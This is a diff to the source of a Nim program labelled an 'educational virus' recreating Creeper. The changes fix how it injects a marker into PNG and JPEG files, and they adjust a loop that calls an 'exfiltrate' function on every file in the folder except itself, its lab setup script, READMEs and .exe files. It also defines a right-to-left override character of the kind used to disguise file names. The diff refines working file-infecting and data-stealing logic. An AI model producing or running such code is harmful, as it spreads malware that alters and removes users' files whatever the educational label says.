@@ -1,7 +1,7 @@
 # Creeper (1971) - Educational virus (Nim version)
 # Compile: nim c creeper.nim
 
-import os, strutils, times, sugar
+import os, strutils, times, sequtils
 
 const SelfSource = "creeper.nim"
 const Rtl = "\u202E"
@@ -88,18 +88,19 @@ proc infectBinary(path: string): bool =
   of ".png":
     let pos = data.find("IEND")
     if pos >= 0:
-      let split = pos + 12
-      var new = data[0..<split] & marker & data[split..^1]
-      try:
-        writeFile(path, new)
-        echo "[creep] infected: ", name, " (appended marker after IEND)"
-        return true
-      except: discard
+      let split = pos + 8
+      if split <= data.len:
+        var newData = data[0..<split] & marker & data[split..^1]
+        try:
+          writeFile(path, newData)
+          echo "[creep] infected: ", name, " (appended marker after IEND)"
+          return true
+        except: discard
   of ".jpg", ".jpeg":
     if data.len >= 2 and data[^2..^1] == [0xFF.char, 0xD9.char]:
-      var new = data[0..^3] & marker & "\xff\xd9"
+      var newData = data[0..^3] & marker & "\xff\xd9"
       try:
-        writeFile(path, new)
+        writeFile(path, newData)
         echo "[creep] infected: ", name, " (appended marker before EOI)"
         return true
       except: discard
@@ -147,7 +148,7 @@ proc main() =
   # 1. READ
   for (kind, f) in files:
     if kind != pcFile: continue
-    if f == SelfSource or f == "setup_lab.py" or f.startsWith("README"): continue
+    if f == SelfSource or f == "setup_lab.py" or f.startsWith("README") or f.endsWith(".exe"): continue
     exfiltrate(f)
     inc readCount
 
